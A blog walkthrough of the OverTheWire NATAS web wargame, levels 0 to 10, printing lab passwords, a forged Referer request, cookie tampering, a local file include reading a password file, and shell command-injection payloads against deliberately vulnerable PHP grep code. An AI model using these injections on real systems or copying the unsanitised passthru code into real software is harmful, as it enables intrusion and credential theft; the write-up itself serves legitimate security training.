<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="OverTheWire: NATAS 0 – 10" /><meta property="og:locale" content="en" /><meta name="description" content="LEVEL 0" /><meta property="og:description" content="LEVEL 0" /><link rel="canonical" href="https://megawattsec.com/posts/overthewire-natas/" /><meta property="og:url" content="https://megawattsec.com/posts/overthewire-natas/" /><meta property="og:site_name" content="MegaWattSec" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-09-10T15:55:39-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="OverTheWire: NATAS 0 – 10" /><meta name="twitter:site" content="@megawattsec" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2019-09-10T15:55:39-04:00","datePublished":"2019-09-10T15:55:39-04:00","description":"LEVEL 0","headline":"OverTheWire: NATAS 0 – 10","mainEntityOfPage":{"@type":"WebPage","@id":"https://megawattsec.com/posts/overthewire-natas/"},"url":"https://megawattsec.com/posts/overthewire-natas/"}</script><title>OverTheWire: NATAS 0 &#8211; 10 | MegaWattSec</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="MegaWattSec"><meta name="application-name" content="MegaWattSec"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/jamack_close.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">MegaWattSec</a></div><div class="site-subtitle font-italic">Adventures of a Forever-Newb</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/megawattsec" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/megawattsec" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['megawattsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>OverTheWire: NATAS 0 &#8211; 10</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>OverTheWire: NATAS 0 &#8211; 10</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/megawattsec">Dustin</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1568145339" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2019-09-10 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1293 words"> <em>7 min</em> read</span></div></div></div><div class="post-content"><h3 id="level-0"><span class="mr-2">LEVEL 0</span><a href="#level-0" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>The password for the next level is embedded in the HTML source code as a comment.</p><p><code class="language-plaintext highlighter-rouge">&lt;!–The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto –&gt;</code></p><p> </p><h3 id="level-1"><span class="mr-2">LEVEL 1</span><a href="#level-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote><p>You can find the password for the next level on this page, but rightclicking has been blocked!</p></blockquote><p>Press “ALT” button to get to the menu if it isn’t visible, then go to “Tools -&gt; Web Developer Menu” and view the Page Source.</p><p><code class="language-plaintext highlighter-rouge">&lt;!–The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi –&gt;</code></p><p> </p><h3 id="level-2"><span class="mr-2">LEVEL 2</span><a href="#level-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote><p>There is nothing on this page</p></blockquote><p>Looking into the page source, you can see an image “files/pixel.png”.</p><p>If you browse to the “files” directory, it is open for viewing and there’s another file called “users.txt” where you’ll find the next password.</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text"># username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH</code></pre></figure><p> </p><h3 id="level-3"><span class="mr-2">LEVEL 3</span><a href="#level-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote><p>There is nothing on this page</p></blockquote><p>Looking in the page source, you’ll see <span class="lang:xhtml decode:true crayon-inline ">&lt;!– No more information leaks!! Not even Google will find it this time… –&gt;</span> . That makes me think they’re trying to block Google’s web crawler’s from picking up something. It’s a well known flaw to have secret things listed in the “robots.txt” file that web crawlers look for, so take a look there.</p><p>Voila!</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">User-agent: *
Disallow: /s3cr3t/</code></pre></figure><p>In the “s3cr3t” directory, there’s a “users.txt” file with the next credentials.</p><p><code class="language-plaintext highlighter-rouge">natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p><p> </p><h3 id="level-4"><span class="mr-2">LEVEL 4</span><a href="#level-4" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote><p>Access disallowed. You are visiting from “” while authorized users should come only from “http://natas5.natas.labs.overthewire.org/”</p></blockquote><p>This makes me think it’s checking the referrer to see what page we’re coming from.</p><p>To edit HTTP headers and other changes, I like to use Burp Suite, which is purpose built for testing websites.</p><p>Using Burp, view the headers on the request and see what the referrer is. Mine didn’t have a referrer, so that explains the blank quotes on the page.</p><p>I added a referrer like so:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">GET / HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: __cfduid=d36afe6edde0ea62a428daa5ba6f1cc781568143940
Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Referer: http://natas4.natas.labs.overthewire.org</code></pre></figure><p>and it showed up on the page as:</p><blockquote><p>Access disallowed. You are visiting from “http://natas4.natas.labs.overthewire.org” while authorized users should come only from “http://natas5.natas.labs.overthewire.org/”</p></blockquote><p>So I changed the referrer address to http://natas5.natas.labs.overthewire.org/ and it worked!</p><blockquote><p>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</p></blockquote><p> </p><h3 id="level-5"><span class="mr-2">LEVEL 5</span><a href="#level-5" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><blockquote><p>Access disallowed. You are not logged in</p></blockquote><p>The page source on this one shows nothing. However, the response HTTP headers do show something interesting:</p><figure class="highlight"><pre><code class="language-plain_text" data-lang="plain_text">HTTP/1.1 200 OK
Date: Tue, 10 Sep 2019 20:18:26 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Connection: close
Content-Type: text/html; charset=UTF-8</code></pre></figure><p>It sets a cookie “loggedin” to “0”. If we change that cookie value to “1” it will probably trick the site into thinking we are logged in and can access the content.</p><p>I used the Web Developer Tools in the browser to change the cookie and then refreshed the page to get the next password.</p><blockquote><p>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</p></blockquote><p> </p><h3 id="level-6"><span class="mr-2">LEVEL 6</span><a href="#level-6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-212" data-src="/assets/img/2019/09/level6.png" data-proofer-ignore></p><p>When viewing the sourcecode using the link provided, you’ll notice some PHP code:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
<span class="k">include</span> <span class="s2">"includes/secret.inc"</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"submit"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$secret</span> <span class="o">==</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s2">"Access granted. The password for natas7 is &amp;lt;censored&amp;gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s2">"Wrong secret"</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure><p>The PHP code is looking at an included file called “secret.inc” and checking it against what we’re entering in the input form. Browsing to the included file at “/includes/secret.inc” gives us the secret.</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
<span class="nv">$secret</span> <span class="o">=</span> <span class="s2">"FOEIUWGHFEEUHOFUOIU"</span><span class="p">;</span>
<span class="cp">?&gt;</span></code></pre></figure><p>When you put that secret string into the Input box, it gives you the password for the next level.</p><blockquote><p>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</p></blockquote><p> </p><h3 id="level-7"><span class="mr-2">LEVEL 7</span><a href="#level-7" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 607 136'%3E%3C/svg%3E" class="alignnone size-full wp-image-214" data-src="/assets/img/2019/09/2019-09-11_09h36_35.png" alt="" width="607" height="136" srcset="/assets/img/2019/09/2019-09-11_09h36_35.png 607w,assets/img/2019/09/2019-09-11_09h36_35-300x67.png 300w" sizes="(max-width: 607px) 100vw, 607px" data-proofer-ignore></p><p>This level gives us two pages we can browse to, “Home” and “About”. They’re equally boring and probably not worth clicking on. What is worth investigating is the page source however. There you’ll see:</p><p><code class="language-plaintext highlighter-rouge">&lt;!– hint: password for webuser natas8 is in /etc/natas_webpass/natas8 –&gt;</code></p><p>That suggests to solve this level, we will need to pull a file from the server. Local File Include vulnerability maybe? In the page source, the links to “Home” and “About” show a PHP script is being called to serve them, by passing “page=” to “index.php”. Putting in the path to the webpass file into the “page” variable will probably give us the password.</p><p>Sure enough, it does!</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1029 297'%3E%3C/svg%3E" class="alignnone wp-image-215 size-full" data-src="/assets/img/2019/09/2019-09-11_09h53_24.png" alt="" width="1029" height="297" srcset="/assets/img/2019/09/2019-09-11_09h53_24.png 1029w,assets/img/2019/09/2019-09-11_09h53_24-300x87.png 300w,assets/img/2019/09/2019-09-11_09h53_24-768x222.png 768w,assets/img/2019/09/2019-09-11_09h53_24-1024x296.png 1024w" sizes="(max-width: 1029px) 100vw, 1029px" data-proofer-ignore></p><p> </p><h3 id="level-8"><span class="mr-2">LEVEL 8</span><a href="#level-8" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 601 191'%3E%3C/svg%3E" class="alignnone size-full wp-image-212" data-src="/assets/img/2019/09/level6.png" alt="" width="601" height="191" srcset="/assets/img/2019/09/level6.png 601w,assets/img/2019/09/level6-300x95.png 300w" sizes="(max-width: 601px) 100vw, 601px" data-proofer-ignore></p><p>This is another secret sauce input box. Glad they have that sourcecode button or these might really be hard.</p><p>There is PHP code in the source on this one as well:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>

<span class="nv">$encodedSecret</span> <span class="o">=</span> <span class="s2">"3d3d516343746d4d6d6c315669563362"</span><span class="p">;</span>

<span class="k">function</span> <span class="n">encodeSecret</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">bin2hex</span><span class="p">(</span><span class="nb">strrev</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$secret</span><span class="p">)));</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"submit"</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nf">encodeSecret</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'secret'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$encodedSecret</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"Access granted. The password for natas9 is &amp;lt;censored&amp;gt;"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">print</span> <span class="s2">"Wrong secret"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure><p>Notice this part:</p><p><code class="language-plaintext highlighter-rouge">return bin2hex(strrev(base64_encode($secret)));</code></p><p>It is taking the secret string, base64 encoding it, then reversing the letters, then hex encoding the characters. So to get the original string, we only have to do the exact opposite!</p><p>To decode the Secret from hex back to ASCII, use the “XXD” command like so:</p><p><code class="language-plaintext highlighter-rouge">echo -n "3d3d516343746d4d6d6c315669563362" | xxd -r -ps</code></p><p>The “rev” command will reverse the string.</p><p>And lastly, the “base64” command will decode it to it’s original form. Putting all of this together looks like this:</p><p><code class="language-plaintext highlighter-rouge">echo -n “3d3d516343746d4d6d6c315669563362” | xxd -r -ps | rev | base64 -d</code></p><p>Take the result and submit it in the form to get the next password!</p><p> </p><h3 id="level-9"><span class="mr-2">LEVEL 9</span><a href="#level-9" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-216" data-src="/assets/img/2019/09/2019-09-11_12h10_30.png" data-proofer-ignore></p><p>The PHP code in this page is:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"needle"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"needle"</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">passthru</span><span class="p">(</span><span class="s2">"grep -i </span><span class="nv">$key</span><span class="s2"> dictionary.txt"</span><span class="p">);</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure><p>So this code is taking our input variable “needle” and passing it’s value to “grep”, which looks up the value in a dictionary file, then returns the result.</p><p>We can exploit an injection here, with command substitution. Using a “$()” string will execute whatever is inside the parentheses. Since the rules of the NATAS say that all passwords are stored in “/etc/natas_webpass/”, we can use the injection to read out the file we need.</p><p>If we read out the file by using “cat”, like <code class="language-plaintext highlighter-rouge">?needle=$(cat /etc/natas_webpass/natas10)</code> it won’t return anything since that isn’t in the dictionary file. We could make a script that looks up each character in the password with an “if” statement, showing dictionary results only when we get a match, one character at a time. Pretty sure that’s the way this level was intended to be solved…</p><p>But there is a <em>better</em> way. What if I told you we could use the bash command substitution to forcefully inject the password into the PHP script’s output? I tried a bunch of things, and eventually found that we can inject straight into the output file descriptor for the PHP script. We have to get the Process ID of the PHP script, and bash makes it easy for us by designating a variable for the current PID, “$$”.</p><p>So the command become something like <code class="language-plaintext highlighter-rouge">cat /etc/natas_webpass/natas10 1&gt; /proc/$$/fd/1</code> where “1&gt;” is redirecting output and “/proc/\(/fd/1&amp;#8221; is the output file descriptor for the current process. To send it to the PHP script, type this into the address bar: `?needle=$(cat+/etc/natas_webpass/natas10+1&gt;+/proc/\)/fd/1)`</p><p><img class="alignnone size-full wp-image-217" data-src="/assets/img/2019/09/2019-09-11_13h40_47.png" data-proofer-ignore></p><p>This is the coolest solution I came up with for the whole NATAS site!</p><p> </p><h3 id="level-10"><span class="mr-2">LEVEL 10</span><a href="#level-10" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p><img class="alignnone size-full wp-image-219" data-src="/assets/img/2019/09/2019-09-11_13h51_21.png" data-proofer-ignore></p><p>Oh great, a character filter! Looking into the sourcecode we can see which characters are bad:</p><figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?</span>
<span class="nv">$key</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>

<span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">"needle"</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">"needle"</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/[;|&amp;]/'</span><span class="p">,</span><span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">print</span> <span class="s2">"Input contains an illegal character!"</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nb">passthru</span><span class="p">(</span><span class="s2">"grep -i </span><span class="nv">$key</span><span class="s2"> dictionary.txt"</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span></code></pre></figure><p>The characters “; | &#38;” can’t be used now. No problem, our last solution doesn’t use any of those! Lol, just send the same request as the last level, modified to get the correct password file of course.</p><p><img class="alignnone size-full wp-image-220" data-src="/assets/img/2019/09/2019-09-11_13h56_19.png" data-proofer-ignore></p><p>Boom! Gotcha.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/walkthrough/'>Walkthrough</a>, <a href='/categories/overthewire/'>OverTheWire</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >web</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=OverTheWire: NATAS 0 &amp;#8211; 10 - MegaWattSec&amp;url=https://megawattsec.com/posts/overthewire-natas/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=OverTheWire: NATAS 0 &amp;#8211; 10 - MegaWattSec&amp;u=https://megawattsec.com/posts/overthewire-natas/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://megawattsec.com/posts/overthewire-natas/&amp;text=OverTheWire: NATAS 0 &amp;#8211; 10 - MegaWattSec" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/hackthebox-haystack/">HackTheBox: Haystack</a><li><a href="/posts/hackthebox-craft/">HackTheBox: Craft</a><li><a href="/posts/hackthebox-bastion/">HackTheBox: Bastion</a><li><a href="/posts/hackthebox-jarvis/">HackTheBox: Jarvis</a><li><a href="/posts/hackthebox-swagshop/">HackTheBox: SwagShop</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/overthewire-natas-16/"><div class="card-body"> <em class="timeago small" data-ts="1568402533" > 2019-09-13 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 16 &#8211; 20</h3><div class="text-muted small"><p> LEVEL 16 This level looks a lot like level 9 did with the dictionary lookup and it suggests there are now more input checks. Let’s see the source: {% highlight php %} Find words containing: ...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-21/"><div class="card-body"> <em class="timeago small" data-ts="1568659795" > 2019-09-16 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 21 &#8211; 25</h3><div class="text-muted small"><p> LEVEL 21 This level has a second site associated with it, where all the action is: Main Site PHP sourcecode of the main page: {% highlight php %} &amp;lt;? function print_credentials() { if...</p></div></div></a></div><div class="card"> <a href="/posts/overthewire-natas-26/"><div class="card-body"> <em class="timeago small" data-ts="1568918412" > 2019-09-19 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>OverTheWire: NATAS 26 &#8211; 27</h3><div class="text-muted small"><p> LEVEL 26 The sourcecode: {% highlight php %} &amp;lt;?php // sry, this is ugly as hell. // cheers kaliman ;) // - morla class Logger{ private $logFile; private $initMsg; private ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/hackthebox-swagshop/" class="btn btn-outline-primary" prompt="Older"><p>HackTheBox: SwagShop</p></a> <a href="/posts/overthewire-natas-11/" class="btn btn-outline-primary" prompt="Newer"><p>OverTheWire: NATAS 11 &#8211; 15</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/megawattsec">Dustin</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/mysql/">mysql</a> <a class="post-tag" href="/tags/perl/">perl</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/anti-csrf/">anti-csrf</a> <a class="post-tag" href="/tags/api/">api</a> <a class="post-tag" href="/tags/cve-2019-9185/">CVE-2019-9185</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/elasticsearch/">elasticsearch</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script 